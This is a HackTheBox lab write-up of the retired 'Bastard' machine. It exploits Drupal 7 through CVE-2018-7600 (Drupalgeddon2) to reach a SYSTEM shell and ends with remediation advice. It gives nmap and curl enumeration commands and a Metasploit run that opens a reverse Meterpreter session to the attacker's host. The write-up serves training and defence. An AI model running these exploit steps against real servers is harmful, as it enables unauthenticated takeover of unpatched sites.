HTB Bastard: Drupalgeddon2 straight to SYSTEM

retired-machineeasy

Bastard is a retired HackTheBox easy Windows machine that is basically a one-CVE lesson. Synopsis: Drupal 7 on IIS, one legendary 2018 RCE (CVE-2018-7600, Drupalgeddon2), and an app pool running as SYSTEM.

$ Enumeration — name the CMS

# bash: scan plus CMS fingerprint
nmap -sC -sV -oN bastard.nmap 10.10.10.9
curl -s http://10.10.10.9/ | grep -i drupal
curl -s http://10.10.10.9/CHANGELOG.txt | head -5

Page source, headers, and CHANGELOG point at a Drupalgeddon2-vulnerable Drupal 7 build. CMS version first, exploit second.

$ Exploitation — Drupalgeddon2 (CVE-2018-7600)

# msfconsole: drupal_drupalgeddon2
msfconsole -q
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(drupal_drupalgeddon2) > set RHOSTS 10.10.10.9
msf6 exploit(drupal_drupalgeddon2) > set LHOST 10.10.14.23
msf6 exploit(drupal_drupalgeddon2) > run
[*] Meterpreter session 1 opened as NT AUTHORITY\SYSTEM

Drupalgeddon2 abuses form-API input sanitization to execute PHP without authentication. No credentials, no user interaction — and the IIS app pool runs as SYSTEM, so both flags fall in the single session. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Enumerating SMB and FTP for an hour (the site tells you it is Drupal — follow the CMS lead) and hand-rolling the exploit before trying the module (run the known-good module to confirm, then study its requests to learn).

$ Remediation notes

Patch Drupal on release day for critical SA-CORE advisories, run app pools as least-privilege identities, and WAF the known Drupalgeddon request shapes. Written by Lucky Thandel.
